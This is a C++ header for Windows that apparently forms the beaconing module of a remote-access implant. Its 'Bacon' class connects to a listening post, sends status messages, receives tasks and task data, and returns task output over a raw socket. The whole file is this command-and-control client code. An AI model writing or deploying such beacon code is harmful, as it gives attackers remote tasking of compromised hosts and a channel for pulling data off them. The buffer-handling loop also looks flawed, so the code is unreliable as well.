#ifndef bacon_h
#define bacon_h
/*
 * The bacon provides network connectivity,
 * it reports to the lp and downloads new tasking.
 */
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <tchar.h>
#include "SmallStuff.h"

#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")

class Bacon {
private:
	WSADATA wsaData;
	SOCKET connectSocket;
	sockaddr_in baconClient;

	int bytesSent;
	int bytesRcvd;
	int ERRORCODE;
	char *buffPTR;

public:
	Bacon(PCSTR IP, unsigned int PORT);
	BOOL sendOink(oink &baconStatus);
	BOOL getOinkReply(task &inTask);
	BOOL sendOinkRGR(oink &acknowledged);
	BOOL getTaskData(char* buffer, unsigned int size);
	BOOL sendTaskData(void* buffer, unsigned int size);
	~Bacon();
};

//=================== end declaration =======================//

Bacon::Bacon(PCSTR IP, unsigned int PORT)
{
	ERRORCODE = 0;

	printf("-Initializing the bacon. %s:%d\n", IP, PORT);
	
	WSAStartup(MAKEWORD(2,2), &wsaData);
	
	baconClient.sin_family = AF_INET;
	baconClient.sin_addr.s_addr = inet_addr(IP);
	baconClient.sin_port = htons(PORT);

	printf("-Creating Socket.\n");

	connectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (connectSocket == INVALID_SOCKET) 
	{
		printf("socket failed with error: %ld\n", WSAGetLastError());

	}

}
BOOL Bacon::sendOink(oink &baconStatus)
{
	printf("-Sending Oink.\n");

	ERRORCODE = connect(connectSocket, (sockaddr *)&baconClient, sizeof(baconClient));
	if(!ERRORCODE)
	{
		bytesSent = send(connectSocket, reinterpret_cast<char*>(&baconStatus), sizeof(oink), 0);
		printf("-Sent %d bytes..\n", bytesSent);
		return true;
	}
	else
	{
		printf("Couldn't connect error: %ld\n", WSAGetLastError());
		return false;
	}

}
BOOL Bacon::getOinkReply(task &inTask)
{
	bytesRcvd = recv(connectSocket, reinterpret_cast<char*>(&inTask), sizeof(task), 0);
	if(!bytesRcvd)
	{
		printf("connection closed from other end\n");
		return false;
	}
	else
	{
		return true;
	}
}
BOOL Bacon::sendOinkRGR(oink &acknowledged)
{
	printf("Inside RGR.\n");
	bytesSent = send(connectSocket, reinterpret_cast<char*>(&acknowledged), sizeof(oink), 0);
	if(!bytesSent)
	{
		printf("send failed with error: %ld\n", WSAGetLastError());
		return false;
	}
	else
	{
		shutdown(connectSocket, SD_SEND);
		return true;
	}
}
BOOL Bacon::getTaskData(char buffer[], unsigned int size)
{
	buffPTR = buffer;
	bytesRcvd = 0;
	do{
		printf("Writing to buffer size %d at address %d\n", size, buffPTR);
		bytesRcvd = recv(connectSocket, buffPTR, size, 0);
		printf("Received %d byes.\n", bytesRcvd);
		buffPTR += bytesRcvd;
		size -= bytesRcvd;
	}while(bytesRcvd);

	return true;
}
BOOL Bacon::sendTaskData(void* buffer, unsigned int size)
{
	bytesSent = send(connectSocket, reinterpret_cast<char*>(buffer), size, 0);
	if(!bytesSent)
	{
		return false;
	}
	else  //possible need for a while loop 
	{
		return true;
	}
}
Bacon::~Bacon()
{
	shutdown(connectSocket, SD_BOTH);
	closesocket(connectSocket);
	WSACleanup();
}



#endif